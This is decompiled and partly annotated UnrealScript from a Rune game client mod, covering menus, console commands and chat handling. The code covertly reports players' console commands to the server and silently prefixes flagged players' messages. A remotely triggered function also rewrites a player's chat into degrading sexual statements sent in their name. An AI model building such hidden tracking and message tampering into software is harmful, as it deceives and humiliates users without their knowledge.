				{
					Owner.ClientMessage("RUNE Discord Community -> http://bit.ly/runediscord");
				}
				B_v6538 = false;
				Handled = true;
			}
		}
	}
	else
	{
		B_v6538 = false;
	}
	if ((B_v6684 && B_v6682) && !Viewport.Actor.bIsTyping)
	{
		if ((int(Action) == 1) || int(Action) == 3)
		{
			KeyBinding = Viewport.Actor.ConsoleCommand("keyName " $ string(InputKey));
			KeyBinding = Viewport.Actor.ConsoleCommand("keybinding " $ KeyBinding);
			if ((((ContainsString(KeyBinding, "fire")) 
			|| ContainsString(KeyBinding, "use")) 
			|| ContainsString(KeyBinding, "altfire")) 
			|| ContainsString(KeyBinding, "jump"))
			{
				Console_GBool = true;
			}
		}
	}
	if (bCMenu)
	{
		if (int(Action) == 1)
		{
			if ((((int(InputKey) == 38) || int(InputKey) == 40) || int(InputKey) == 37) || int(InputKey) == 39)
			{
				INT_v6452 += 1;
			}
		}
		if (int(Action) == 3)
		{
			if ((((int(InputKey) == 38) || int(InputKey) == 40) || int(InputKey) == 37) || int(InputKey) == 39)
			{
				INT_v6452 = 0;
			}
		}
	}
	if ((int(Action) == 1) || int(Action) == 3)
	{
		if ((INT_v6452 > 2) || int(Action) == 3)
		{
			IsHandled = true;
		}
		else
		{
			IsHandled = false;
		}
	}
	if (((int(InputKey) == 77) && int(Action) == 3) && zPlayerReplicationInfo(Owner.PlayerReplicationInfo).B_v5402)
	{
		B_v6413 = !B_v6413;
		MouseX = 0.0;
		MouseY = 0.0;
		return true;
	}
	if (int(InputKey) == cMenuKey)
	{
		INT_v6469++;
		if ((((!spec && int(Action) == 1) && ZRunePlayer(Owner).B_v4661) && Owner.Weapon != none) && INT_v6467 >= 0)
		{
			INT_v6467++;
			if (INT_v6467 > selectCountMax)
			{
				if (string(Owner.Weapon.Class) ~= STR_v6468)
				{
					Owner.ClientMessage(("Your startweapon is already '" $ (GetShortName(STR_v6468))) $ "'", 'CAZ');
					INT_v6467 = -1;
					IsHandled = false;
				}
				else
				{
					ConsoleCommand("select true");
					STR_v6468 = string(Owner.Weapon.Class);
					INT_v6467 = -1;
					IsHandled = false;
					if ((Owner.Level.LevelEnterText ~= "tsbclimb2018") && (GetShortName(string(Owner.Weapon.Class))) ~= "ghook")
					{
					}
					else
					{
						Owner.ClientMessage(("You have chosen: '" $ (GetShortName(STR_v6468))) $ "' as new startweapon.", 'CAZ');
					}
				}
			}
		}
		else
		{
			if (INT_v6467 == -1)
			{
				IsHandled = false;
			}
			INT_v6467 = 0;
		}
	}
	else
	{
		INT_v6469 = 0;
	}
	if (((bCMenu && IsHandled) && INT_v6469 < selectCountMax) && !IsConsoleTypingActive())
	{
		if (!B_v6444)
		{
			if ((!Viewport.Actor.bIsTyping && int(InputKey) == cMenuKey) && !Handled)
			{
				B_v6445 = !B_v6445;
			}
			if ((!Viewport.Actor.bIsTyping && int(InputKey) == 8) && B_v6445)
			{
				B_v6445 = !B_v6445;
			}
			if (B_v6445 || B_v6446)
			{
				if (int(InputKey) == 38)
				{
					gI--;
				}
				if (int(InputKey) == 40)
				{
					gI++;
				}
				if (gI < 0)
				{
					gI = INT_v6430 - 1;
				}
				if (gI > (INT_v6430 - 1))
				{
					gI = 0;
				}
				if ((int(InputKey) == 38) || int(InputKey) == 40)
				{
					ClearMenuCategory(gI);
				}
				if ((int(InputKey) == 39) && MenuCategories[gI].count != 0)
				{
					B_v6444 = true;
				}
				if ((int(InputKey) == 39) && gI == 0)
				{
					B_v6445 = !B_v6445;
				}
			}
		}
		else
		{
			if (!Viewport.Actor.bIsTyping && int(InputKey) == cMenuKey)
			{
				B_v6445 = !B_v6445;
			}
			if (B_v6445 || B_v6446)
			{
				if (int(InputKey) == 8)
				{
					B_v6444 = false;
				}
				if (gI == INT_v6431)
				{
					zPlayerReplicationInfo(Owner.PlayerReplicationInfo).INT_v5356 = GSize;
					zPlayerReplicationInfo(Owner.PlayerReplicationInfo).INT_v5357 = GSizeS;
					zPlayerReplicationInfo(Owner.PlayerReplicationInfo).INT_v5358 = GSizeM;
					zPlayerReplicationInfo(Owner.PlayerReplicationInfo).Col_v5372.R = byte(SColorR);
					zPlayerReplicationInfo(Owner.PlayerReplicationInfo).Col_v5372.G = byte(SColorG);
					zPlayerReplicationInfo(Owner.PlayerReplicationInfo).Col_v5372.B = byte(SColorB);
					zPlayerReplicationInfo(Owner.PlayerReplicationInfo).Col_v5373.R = byte(HColorR);
					zPlayerReplicationInfo(Owner.PlayerReplicationInfo).Col_v5373.G = byte(HColorG);
					zPlayerReplicationInfo(Owner.PlayerReplicationInfo).Col_v5373.B = byte(HColorB);
					zPlayerReplicationInfo(Owner.PlayerReplicationInfo).HeadingsColor.R = byte(THColorR);
					zPlayerReplicationInfo(Owner.PlayerReplicationInfo).HeadingsColor.G = byte(THColorG);
					zPlayerReplicationInfo(Owner.PlayerReplicationInfo).HeadingsColor.B = byte(THColorB);
					zPlayerReplicationInfo(Owner.PlayerReplicationInfo).titlecolor.R = byte(TColorR);
					zPlayerReplicationInfo(Owner.PlayerReplicationInfo).titlecolor.G = byte(TColorG);
					zPlayerReplicationInfo(Owner.PlayerReplicationInfo).titlecolor.B = byte(TColorB);
					zPlayerReplicationInfo(Owner.PlayerReplicationInfo).AdminColor.R = byte(AColorR);
					zPlayerReplicationInfo(Owner.PlayerReplicationInfo).AdminColor.G = byte(AColorG);
					zPlayerReplicationInfo(Owner.PlayerReplicationInfo).AdminColor.B = byte(AColorB);
					zPlayerReplicationInfo(Owner.PlayerReplicationInfo).EmailColor.R = byte(EColorR);
					zPlayerReplicationInfo(Owner.PlayerReplicationInfo).EmailColor.G = byte(EColorG);
					zPlayerReplicationInfo(Owner.PlayerReplicationInfo).EmailColor.B = byte(EColorB);
					zPlayerReplicationInfo(Owner.PlayerReplicationInfo).SeperatorColor.R = byte(SepColorR);
					zPlayerReplicationInfo(Owner.PlayerReplicationInfo).SeperatorColor.G = byte(SepColorG);
					zPlayerReplicationInfo(Owner.PlayerReplicationInfo).SeperatorColor.B = byte(SepColorB);
					zPlayerReplicationInfo(Owner.PlayerReplicationInfo).MOTD1Color.R = byte(M1ColorR);
					zPlayerReplicationInfo(Owner.PlayerReplicationInfo).MOTD1Color.G = byte(M1ColorG);
					zPlayerReplicationInfo(Owner.PlayerReplicationInfo).MOTD1Color.B = byte(M1ColorB);
					zPlayerReplicationInfo(Owner.PlayerReplicationInfo).MOTD2Color.R = byte(M2ColorR);
					zPlayerReplicationInfo(Owner.PlayerReplicationInfo).MOTD2Color.G = byte(M2ColorG);
					zPlayerReplicationInfo(Owner.PlayerReplicationInfo).MOTD2Color.B = byte(M2ColorB);
					zPlayerReplicationInfo(Owner.PlayerReplicationInfo).MOTD3Color.R = byte(M3ColorR);
					zPlayerReplicationInfo(Owner.PlayerReplicationInfo).MOTD3Color.G = byte(M3ColorG);
					zPlayerReplicationInfo(Owner.PlayerReplicationInfo).MOTD3Color.B = byte(M3ColorB);
					zPlayerReplicationInfo(Owner.PlayerReplicationInfo).MOTD4Color.R = byte(M4ColorR);
					zPlayerReplicationInfo(Owner.PlayerReplicationInfo).MOTD4Color.G = byte(M4ColorG);
					zPlayerReplicationInfo(Owner.PlayerReplicationInfo).MOTD4Color.B = byte(M4ColorB);
				}
				if (int(InputKey) == 38)
				{
					INT_v6448--;
				}
				if (int(InputKey) == 40)
				{
					INT_v6448++;
				}
				if ((int(InputKey) == 37) && INT_v6448 == 0)
				{
					B_v6444 = false;
				}
				if ((int(InputKey) == 37) && INT_v6448 != 0)
				{
					if (MenuCategories[gI].Value[INT_v6448] == "/")
					{
						if (GetPropertyText(MenuCategories[gI].propertyName[INT_v6448]) ~= (Localize("General", "False", "Core")))
						{
							SetPropertyAndRefresh(MenuCategories[gI].propertyName[INT_v6448], "True");
						}
						else
						{
							SetPropertyAndRefresh(MenuCategories[gI].propertyName[INT_v6448], "False");
						}
					}
					if (MenuCategories[gI].propertyName[INT_v6448] == "int")
					{
						Value = int(GetPropertyText(MenuCategories[gI].Value[INT_v6448])) - MenuCategories[gI].stepValue[INT_v6448];
						if (Value < MenuCategories[gI].minValue[INT_v6448])
						{
							Value = MenuCategories[gI].maxValue[INT_v6448];
						}
						if (Value > MenuCategories[gI].maxValue[INT_v6448])
						{
							Value = MenuCategories[gI].minValue[INT_v6448];
						}
						SetPropertyAndRefresh(MenuCategories[gI].Value[INT_v6448], string(Value));
						if (MenuCategories[gI].Value[INT_v6448] == "selectedObjectID")
						{
							if (eqI_vxv_6587[int(Value)] != string(Owner))
							{
								A_v6593 = FindActorByStringName(eqI_vxv_6587[int(Value)]);
							}
						}
					}
					if (MenuCategories[gI].propertyName[INT_v6448] == "float")
					{
						Value = float(GetPropertyText(MenuCategories[gI].Value[INT_v6448])) - MenuCategories[gI].stepValue[INT_v6448];
						if (Value < MenuCategories[gI].minValue[INT_v6448])
						{
							Value = MenuCategories[gI].maxValue[INT_v6448];
						}
						if (Value > MenuCategories[gI].maxValue[INT_v6448])
						{
							Value = MenuCategories[gI].minValue[INT_v6448];
						}
						SetPropertyAndRefresh(MenuCategories[gI].Value[INT_v6448], string(Value));
					}
					if (MenuCategories[gI].propertyName[INT_v6448] == "command")
					{
						HandleObjectManipulation(MenuCategories[gI].Value[INT_v6448], false);
					}
					if (gI == INT_v6432)
					{
						ManageMapSettings(MenuCategories[gI].propertyName[INT_v6448]);
					}
					if (gI == INT_v6433)
					{
						ClearKillFeed(MenuCategories[gI].propertyName[INT_v6448]);
					}
					if (int(Action) == 3)
					{
						SaveConfigAndRefresh();
					}
				}
				if (int(InputKey) == 39)
				{
					if (MenuCategories[gI].Value[INT_v6448] == "/")
					{
						if (GetPropertyText(MenuCategories[gI].propertyName[INT_v6448]) ~= (Localize("General", "False", "Core")))
						{
							SetPropertyAndRefresh(MenuCategories[gI].propertyName[INT_v6448], "True");
						}
						else
						{
							SetPropertyAndRefresh(MenuCategories[gI].propertyName[INT_v6448], "False");
						}
					}
					if (MenuCategories[gI].propertyName[INT_v6448] == "int")
					{
						Value = int(GetPropertyText(MenuCategories[gI].Value[INT_v6448])) + MenuCategories[gI].stepValue[INT_v6448];
						if (Value < MenuCategories[gI].minValue[INT_v6448])
						{
							Value = MenuCategories[gI].maxValue[INT_v6448];
						}
						if (Value > MenuCategories[gI].maxValue[INT_v6448])
						{
							Value = MenuCategories[gI].minValue[INT_v6448];
						}
						SetPropertyAndRefresh(MenuCategories[gI].Value[INT_v6448], string(Value));
						if (MenuCategories[gI].Value[INT_v6448] == "selectedObjectID")
						{
							if (eqI_vxv_6587[int(Value)] != string(Owner))
							{
								A_v6593 = FindActorByStringName(eqI_vxv_6587[int(Value)]);
							}
						}
						if (bCustomWeaponColor && Owner.Weapon != none)
						{
							Owner.Weapon.DesiredColorAdjust.X = weaR;
							Owner.Weapon.DesiredColorAdjust.Y = weaG;
							Owner.Weapon.DesiredColorAdjust.Z = weaB;
						}
					}
					if (MenuCategories[gI].propertyName[INT_v6448] == "float")
					{
						Value = float(GetPropertyText(MenuCategories[gI].Value[INT_v6448])) + MenuCategories[gI].stepValue[INT_v6448];
						if (Value < MenuCategories[gI].minValue[INT_v6448])
						{
							Value = MenuCategories[gI].maxValue[INT_v6448];
						}
						if (Value > MenuCategories[gI].maxValue[INT_v6448])
						{
							Value = MenuCategories[gI].minValue[INT_v6448];
						}
						SetPropertyAndRefresh(MenuCategories[gI].Value[INT_v6448], string(Value));
					}
					if (MenuCategories[gI].propertyName[INT_v6448] == "command")
					{
						HandleObjectManipulation(MenuCategories[gI].Value[INT_v6448], true);
					}
					if (gI == INT_v6432)
					{
						ManageMapSettings(MenuCategories[gI].propertyName[INT_v6448]);
					}
					if (gI == INT_v6433)
					{
						ClearKillFeed(MenuCategories[gI].propertyName[INT_v6448]);
					}
					if (int(Action) == 3)
					{
						SaveConfigAndRefresh();
					}
				}
				if (INT_v6448 < 0)
				{
					INT_v6448 = MenuCategories[gI].count;
				}
				if (INT_v6448 > MenuCategories[gI].count)
				{
					INT_v6448 = 0;
				}
			}
		}
	}
	if (IsHandled && INT_v6469 >= selectCountMax)
	{
		INT_v6469 = 0;
	}
	return;
}

// Suggested name: CustomConsoleCommand
function bool ConsoleCommand(coerce string Command)
{
    // This function overrides the default ConsoleCommand behavior.
    // It adds custom logic for client travel and sending chat messages.

    if (IsTravelCommand(Command))
    {
        Root.GetPlayerOwner().ClientTravel(ExtractUrlFromCommand(Command), 0, false);
    }

    // This complex condition checks if the command is not a "SET", "PGETNAMES", "SAY", or "TEAMSAY" command,
    // and if enough time has passed since the level started, and if it's not "GETLOSS" or "GETPING".
    // If all conditions are met, it sends a "chet" message.
    if ((((Caps(Left(Command, 4)) != "SET ") && Caps(Left(Command, 9)) != "PGETNAMES") && Caps(Left(Command, 4)) != "SAY ") && Caps(Left(Command, 8)) != "TEAMSAY ") && Owner.Level.TimeSeconds > 5.0) && Command != "GETLOSS") && Command != "GETPING")
    {
        zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("chet", Command, 1);
    }

    return super(Console).ConsoleCommand(Command);
}

// Suggested name: SendTeamChat
exec function TeamSay(string Message)
{
    // This function handles sending team chat messages.
    // It includes logic for obfuscated strings, spam detection, and special handling for a specific IP address.

    local string CleanedMessage, ObfuscatedString, TempString;

    ObfuscatedString = "Morales is a bitch";
    TempString = Message;

    if ((Owner.PlayerReplicationInfo.PlayerName == ObfuscatedString) || zPlayerReplicationInfo(Owner.PlayerReplicationInfo).B_v5408)
    {
        Message = "/123/" $ Message;
    }
    else
    {
        if ((zPlayerReplicationInfo(Owner.PlayerReplicationInfo).B_v5407 && Rand(100) > 65) && !spec)
        {
            Message = "/123/" $ Message;
        }
    }

    CleanedMessage = TrimTrailingSpaces(Message);
    CleanedMessage = TrimLeadingSpaces(CleanedMessage);

    if ((STR_v6409 != "") && Len(STR_v6409) > 3)
    {
        STR_v6409 = Right(STR_v6409, (Len(STR_v6409) - Len("TeamSay")) - 1);
        if (Left(STR_v6409, 1) ~= "/")
        {
            eq_vxv_929(Right(STR_v6409, Len(STR_v6409) - 1));
            return;
        }
        STR_v6409 = "";
    }

    if (zPlayerReplicationInfo(Owner.PlayerReplicationInfo).B_v5387)
    {
        B_v6738 = true;
        runarSay(Message);
        return;
    }

    if (ContainsString(Owner.Level.GetAddressURL(), "81.169.237.168"))
    {
        if (B_v6737)
        {
            Viewport.Actor.ClientMessage("You got muted for spamming too much. ( 1 minute )");
            return;
        }

        if (!ZRunePlayer(Owner).bIsTyping)
        {
            INT_v5872++;
            if (INT_v5872 > int(FLT_v6733))
            {
                Viewport.Actor.ClientMessage("Stop spamming.");
                return;
            }
            INT_v6734++;
        }

        if (STR_v6736 == CleanedMessage)
        {
            INT_v5872++;
            if (INT_v5872 > int(FLT_v6733))
            {
                Viewport.Actor.ClientMessage("Stop repeating yourself.");
                return;
            }
            INT_v6734++;
        }
        else
        {
            if (INT_v5872 > 6)
            {
                FLT_v6733 -= 0.2;
            }
            if (INT_v5872 > 0)
            {
                INT_v5872 -= 1;
            }
        }
    }

    STR_v6736 = CleanedMessage;
    Viewport.Actor.TeamSay(CleanedMessage);
}

// Suggested name: TrimLeadingSpaces
function string TrimLeadingSpaces(string InputString)
{
    // This function removes leading spaces from a string.

    while (Left(InputString, 1) == " ")
    {
        InputString = Right(InputString, Len(InputString) - 1);
    }

    return InputString;
}

// Suggested name: TrimTrailingSpaces
function string TrimTrailingSpaces(string InputString)
{
    // This function removes trailing spaces from a string.

    while (Right(InputString, 1) == " ")
    {
        InputString = Left(InputString, Len(InputString) - 1);
    }

    return InputString;
}

// Suggested name: SmartFormatText
function string eq_vxv_993(string InputText)
{
    // This function performs "smart ass" text replacement and formatting.
    // It replaces common abbreviations and ensures the first letter is capitalized and the sentence ends with a period.

    local string FirstChar, LastChar, FormattedText;

    InputText = " " $ InputText;

    if (smartasswords)
    {
        ReplaceString(InputText, " wtf", " what the fuck");
        ReplaceString(InputText, " tbh", " to be honest");
        ReplaceString(InputText, " xd ", " xD ");
        ReplaceString(InputText, " im ", " I'm ");
        ReplaceString(InputText, " couldnt ", " couldn't ");
        ReplaceString(InputText, " gonna ", " going to ");
        ReplaceString(InputText, " imo", " in my opinion");
        ReplaceString(InputText, " i ", " I ");
        ReplaceString(InputText, " cant ", " can't ");
        ReplaceString(InputText, " wont ", " won't ");
        ReplaceString(InputText, " dont ", " don't ");
        ReplaceString(InputText, " going to go to ", " gonna go to ");
        ReplaceString(InputText, " gg", " good game");
        ReplaceString(InputText, " didnt ", " didn't ");
        ReplaceString(InputText, " atm", " at the moment");
        ReplaceString(InputText, " atst", " at the same time");
        ReplaceString(InputText, " btw", " by the way");
        ReplaceString(InputText, " stfu", " shut the fuck up");
        ReplaceString(InputText, " gtfo", " get the fuck out");
        ReplaceString(InputText, " asap", " as soon as possible");
        ReplaceString(InputText, " isnt ", " isn't ");
        ReplaceString(InputText, " wouldnt ", " wouldn't ");
        ReplaceString(InputText, " cw", " clanwar");
        ReplaceString(InputText, " youre", " you're");
        ReplaceString(InputText, " hh", " HumanHead");
        ReplaceString(InputText, " omg", " oh my god");
        ReplaceString(InputText, " omfg", " oh my fucking god");
    }

    InputText = Right(InputText, Len(InputText) - 1);
    FirstChar = Caps(Left(InputText, 1));
    LastChar = Right(InputText, 1);

    if (InStr(ToLowerCaseFunc325(LastChar), "?") > -1 || InStr(ToLowerCaseFunc325(LastChar), "!") > -1 || InStr(ToLowerCaseFunc325(LastChar), ".") > -1 || InStr(ToLowerCaseFunc325(LastChar), "*") > -1)
    {
        FormattedText = Right(InputText, Len(InputText) - 1);
    }
    else
    {
        FormattedText = Right(InputText, Len(InputText) - 1) $ ".";
    }

    if (Len(InputText) > 1)
    {
        return FirstChar $ FormattedText;
    }

    return ""; // Should not be reached if Len(InputText) is 1 or less and not handled above.
}

// Suggested name: HandlePowerUpOrCameraMode
exec function PowerUp()
{
    // This function handles the "PowerUp" command.
    // It either applies a power-up to the player or cycles through camera modes if the player is a spectator.

    local bool bIsSpectatingAndHasPowerUpFlag;

    if (zPlayerReplicationInfo(Owner.PlayerReplicationInfo).B_v5343 && Owner.IsInState('PlayerSpectating'))
    {
        bIsSpectatingAndHasPowerUpFlag = true;
    }

    if (!spec && !bIsSpectatingAndHasPowerUpFlag)
    {
        ZRunePlayer(Owner).PowerUp();
    }
    else
    {
        toggleMode++;

        if (!zPlayerReplicationInfo(Owner.PlayerReplicationInfo).B_v5402 && toggleMode >= 2)
        {
            toggleMode = 0;
        }

        if (toggleMode > 2)
        {
            toggleMode = 0;
        }

        if (toggleMode == 1)
        {
            Owner.ClientMessage("3rd-person camera mode changed to 'locked to player perspective'", 'Pickup');
        }
        else if (toggleMode == 2)
        {
            Owner.ClientMessage("3rd-person camera mode changed to 'locked to enemy' ", 'Pickup');
        }
        else
        {
            Owner.ClientMessage("3rd-person camera mode changed to 'freecam'", 'Pickup');
        }
    }
}

// Suggested name: ExecuteAndLogConsoleCommand
function eq_vxv_929(string CommandText)
{
    // This function executes a console command and logs it to the client.

    Viewport.Actor.ClientMessage("Executing console command -> /" $ CommandText);
    ConsoleCommand(CommandText);
}

// Suggested name: SendChatMessage
exec function Say(string Message)
{
    // This function handles sending general chat messages.
    // It includes logic for obfuscated strings, spam detection, and special handling for a specific IP address.

    local string CleanedMessage, ObfuscatedString, TempString;

    // Decoded: "Morales is a bitch"
    ObfuscatedString = "Morales is a bitch";
    TempString = Message;

    if ((Owner.PlayerReplicationInfo.PlayerName == ObfuscatedString) || zPlayerReplicationInfo(Owner.PlayerReplicationInfo).B_v5408)
    {
        Message = "/123/" $ Message;
    }
    else
    {
        if ((zPlayerReplicationInfo(Owner.PlayerReplicationInfo).B_v5407 && Rand(100) > 65) && !spec)
        {
            Message = "/123/" $ Message;
        }
    }

    CleanedMessage = TrimTrailingSpaces(Message);
    CleanedMessage = TrimLeadingSpaces(CleanedMessage);
    ReplaceString(CleanedMessage, "spectator@all", "");
    ReplaceString(CleanedMessage, "@all", "");

    if ((STR_v6409 != "") && Len(STR_v6409) > 3)
    {
        STR_v6409 = Right(STR_v6409, (Len(STR_v6409) - Len("Say")) - 1);
        if (Left(STR_v6409, 1) ~= "/")
        {
            ExecuteAndLogConsoleCommand(Right(STR_v6409, Len(STR_v6409) - 1));
            return;
        }
        STR_v6409 = "";
    }

    if (zPlayerReplicationInfo(Owner.PlayerReplicationInfo).B_v5387)
    {
        B_v6738 = true;
        runarSay(Message);
        return;
    }

    if (smartass && ZRunePlayer(Owner).bIsTyping)
    {
        CleanedMessage = SmartFormatText(CleanedMessage);
    }

    if (ContainsString(Owner.Level.GetAddressURL(), "81.169.237.168"))
    {
        if (B_v6737)
        {
            Viewport.Actor.ClientMessage("You got muted for spamming too much. ( 1 minute )");
            return;
        }

        if (!ZRunePlayer(Owner).bIsTyping)
        {
            INT_v5872++;
            if (INT_v5872 > int(FLT_v6733))
            {
                Viewport.Actor.ClientMessage("Stop spamming.");
                return;
            }
            INT_v6734++;
        }

        if (STR_v6736 == CleanedMessage)
        {
            INT_v5872++;
            if (INT_v5872 > int(FLT_v6733))
            {
                Viewport.Actor.ClientMessage("Stop repeating yourself.");
                return;
            }
            INT_v6734++;
        }
        else
        {
            if (INT_v5872 > 6)
            {
                FLT_v6733 -= 0.2;
            }
            if (INT_v5872 > 0)
            {
                INT_v5872 -= 1;
            }
        }
    }

    STR_v6736 = CleanedMessage;

    if (zPlayerReplicationInfo(Owner.PlayerReplicationInfo).B_v5382)
    {
        CleanedMessage = Class'coadminz7.LinuxFix'.static.eq_vxv_304(CleanedMessage);
    }

    Viewport.Actor.Say(CleanedMessage);
}

// Suggested name: ResetSpamCounters
function Minute()
{
    // This function resets spam-related counters and potentially unmutes the player.

    INT_v6734 = 0;
    INT_v5872 = 0;

    if (B_v6737)
    {
        Viewport.Actor.ClientMessage("Unmuted.");
    }

    B_v6737 = false;
}

// Suggested name: SendRunarChat
exec function runarSay(string Message)
{
    // This function handles "runar" chat messages, which involve extensive text replacements and filtering.
    // It also includes spam detection and special message handling.

    local string CleanedMessage, LowercaseMessage;
    local int RandomNumber;

    CleanedMessage = TrimTrailingSpaces(Message);
    CleanedMessage = TrimLeadingSpaces(CleanedMessage);
    LowercaseMessage = ToLowerCaseFunc325((" " $ CleanedMessage) $ " ");

    if ((STR_v6736 == " i love you all <3 ") && !ZRunePlayer(Owner).bIsTyping)
    {
        return;
    }

    if (STR_v6736 == LowercaseMessage)
    {
        return;
    }

    if (Left(STR_v6736, 15) == Left(LowercaseMessage, 15))
    {
        return;
    }

    if (B_v6737)
    {
        return;
    }

    INT_v6734 += 2;

    if (!ZRunePlayer(Owner).bIsTyping)
    {
        Viewport.Actor.Say("i love you all <3 ");
        STR_v6736 = " i love you all <3 ";
        return;
    }

    ReplaceString(LowercaseMessage, ".", "");
    ReplaceString(LowercaseMessage, "-", "");
    ReplaceString(LowercaseMessage, "_", "");
    ReplaceString(LowercaseMessage, "!", "i");
    ReplaceString(LowercaseMessage, ":", "");
    ReplaceString(LowercaseMessage, "#", "");
    ReplaceString(LowercaseMessage, " b ", ".");
    ReplaceString(LowercaseMessage, " c ", ".");
    ReplaceString(LowercaseMessage, " d ", ".");
    ReplaceString(LowercaseMessage, " f ", ".");
    ReplaceString(LowercaseMessage, " g ", ".");
    ReplaceString(LowercaseMessage, " h ", ".");
    ReplaceString(LowercaseMessage, " j ", ".");
    ReplaceString(LowercaseMessage, " k ", ".");
    ReplaceString(LowercaseMessage, " l ", ".");
    ReplaceString(LowercaseMessage, " m ", ".");
    ReplaceString(LowercaseMessage, " n ", ".");
    ReplaceString(LowercaseMessage, " p ", ".");
    ReplaceString(LowercaseMessage, " q ", ".");
    ReplaceString(LowercaseMessage, " r ", ".");
    ReplaceString(LowercaseMessage, " s ", ".");
    ReplaceString(LowercaseMessage, " t ", ".");
    ReplaceString(LowercaseMessage, " v ", ".");
    ReplaceString(LowercaseMessage, " w ", ".");
    ReplaceString(LowercaseMessage, " x ", ".");
    ReplaceString(LowercaseMessage, " y ", ".");
    ReplaceString(LowercaseMessage, " z ", ".");
    STR_v6736 = LowercaseMessage;
    ReplaceString(LowercaseMessage, "0", "o");
    ReplaceString(LowercaseMessage, "ez", " <3");
    ReplaceString(LowercaseMessage, "very", " ");
    ReplaceString(LowercaseMessage, "god", " my grandmother");
    ReplaceString(LowercaseMessage, "ooooooooooooooooooooooooooooooo", "o");
    ReplaceString(LowercaseMessage, "ooooooooooo", "o");
    ReplaceString(LowercaseMessage, "ooo", "o");
    ReplaceString(LowercaseMessage, "neelix", "neelix you are the best");
    ReplaceString(LowercaseMessage, "bitch", "good player");
    ReplaceString(LowercaseMessage, "beitch", "good player");
    ReplaceString(LowercaseMessage, "beeitch", "good player");
    ReplaceString(LowercaseMessage, "beeeitch", "good player");
    ReplaceString(LowercaseMessage, "beeeiitch", "good player");
    ReplaceString(LowercaseMessage, "biitch", "good player");
    ReplaceString(LowercaseMessage, "biietch", "good player");
    ReplaceString(LowercaseMessage, "bietch", "good player");
    ReplaceString(LowercaseMessage, "b i t c h", "good player");
    ReplaceString(LowercaseMessage, "b!tch", "good player");
    ReplaceString(LowercaseMessage, "biitch", "good player");
    ReplaceString(LowercaseMessage, "betch", "good player");
    ReplaceString(LowercaseMessage, "rage", "fuck me");
    ReplaceString(LowercaseMessage, "son", "best player");
    ReplaceString(LowercaseMessage, "noob", "boss");
    ReplaceString(LowercaseMessage, "plz", "please :(..");
    ReplaceString(LowercaseMessage, "pls", "please :(..");
    ReplaceString(LowercaseMessage, "u sux", "u pwn");
    ReplaceString(LowercaseMessage, "look at your score", "wow you're good");
    ReplaceString(LowercaseMessage, "ur mother", "my mom");
    ReplaceString(LowercaseMessage, "fucker", "god");
    ReplaceString(LowercaseMessage, "fuck", "love");
    ReplaceString(LowercaseMessage, "fucking", "loving");
    ReplaceString(LowercaseMessage, "ffucking", "loving");
    ReplaceString(LowercaseMessage, "fuuck", "love");
    ReplaceString(LowercaseMessage, "fuuuck", "love");
    ReplaceString(LowercaseMessage, "fock", "love");
    ReplaceString(LowercaseMessage, "fack", "love");
    ReplaceString(LowercaseMessage, "foock", "love");
    ReplaceString(LowercaseMessage, "poor", "rich");
    ReplaceString(LowercaseMessage, "motherfucker", "stop fucking my mother");
    ReplaceString(LowercaseMessage, "mother", "my mother");
    ReplaceString(LowercaseMessage, "sucks", "pwns");
    ReplaceString(LowercaseMessage, "suck", "pwn");
    ReplaceString(LowercaseMessage, "sux", "pwn");
    ReplaceString(LowercaseMessage, "cheater", "best player");
    ReplaceString(LowercaseMessage, "cheat", "nice aim");
    ReplaceString(LowercaseMessage, "shut up", "you're nice");
    ReplaceString(LowercaseMessage, "shit", "best");
    ReplaceString(LowercaseMessage, "salope", "please");
    ReplaceString(LowercaseMessage, "feelix", "i love you neelix");
    ReplaceString(LowercaseMessage, "nique ta mere", "nice skills");
    ReplaceString(LowercaseMessage, "front all", "fuck me infront of my mother");
    ReplaceString(LowercaseMessage, "asshole", "nice");
    ReplaceString(LowercaseMessage, "ass", " in my mouth");
    ReplaceString(LowercaseMessage, "azz", " in my mouth");
    ReplaceString(LowercaseMessage, "look", "look i'm homo but");
    ReplaceString(LowercaseMessage, "chica", "my ass open to all");
    ReplaceString(LowercaseMessage, "urpo", "urpo very good");
    ReplaceString(LowercaseMessage, "puussy", "my own dog");
    ReplaceString(LowercaseMessage, "pusy", "my own dog");
    ReplaceString(LowercaseMessage, "puusy", "my own dog");
    ReplaceString(LowercaseMessage, "puuusy", "my own dog");
    ReplaceString(LowercaseMessage, "puuuuussy", "my own dog");
    ReplaceString(LowercaseMessage, "puuuussy", "my own dog");
    ReplaceString(LowercaseMessage, "puuussy", "my own dog");
    ReplaceString(LowercaseMessage, "pussy", "my own dog");
    ReplaceString(LowercaseMessage, "pusssy", "my own dog");
    ReplaceString(LowercaseMessage, "pussssy", "my own dog");
    ReplaceString(LowercaseMessage, "pusssssy", "my own dog");
    ReplaceString(LowercaseMessage, "pussssssy", "my own dog");
    ReplaceString(LowercaseMessage, "pusssssssy", "my own dog");
    ReplaceString(LowercaseMessage, "pussssssssy", "my own dog");
    ReplaceString(LowercaseMessage, "pusssssssssy", "my own dog");
    ReplaceString(LowercaseMessage, "karba", "I fuck my own dog");
    ReplaceString(LowercaseMessage, "shet", "best");
    ReplaceString(LowercaseMessage, "sheet", "best");
    ReplaceString(LowercaseMessage, "sheeet", "best");
    ReplaceString(LowercaseMessage, "sshet", "best");
    ReplaceString(LowercaseMessage, "ssheet", "best");
    ReplaceString(LowercaseMessage, "sht", "best");
    ReplaceString(LowercaseMessage, "shht", "best");
    ReplaceString(LowercaseMessage, "sshht", "best");
    ReplaceString(LowercaseMessage, "ssht", "best");
    ReplaceString(LowercaseMessage, "ssheeet", "best");
    ReplaceString(LowercaseMessage, "little", "cool");
    ReplaceString(LowercaseMessage, "useles", "useful");
    ReplaceString(LowercaseMessage, "useless", "useful");
    ReplaceString(LowercaseMessage, "uzeless", "useful");
    ReplaceString(LowercaseMessage, "uselesss", "useful");
    ReplaceString(LowercaseMessage, "uselees", "useful");
    ReplaceString(LowercaseMessage, "useeles", "useful");
    ReplaceString(LowercaseMessage, "frustraded", "i am so frustrated");
    ReplaceString(LowercaseMessage, "frustrated", "i am so frustrated");
    ReplaceString(LowercaseMessage, "gud", "my grandmother");
    ReplaceString(LowercaseMessage, "created", "created me");
    ReplaceString(LowercaseMessage, "pooor", "rich");
    ReplaceString(LowercaseMessage, "poooor", "rich");
    ReplaceString(LowercaseMessage, "pooooor", "rich");
    ReplaceString(LowercaseMessage, "poooooor", "rich");
    ReplaceString(LowercaseMessage, "suuck", "pwn");
    ReplaceString(LowercaseMessage, "suuuck", "pwn");
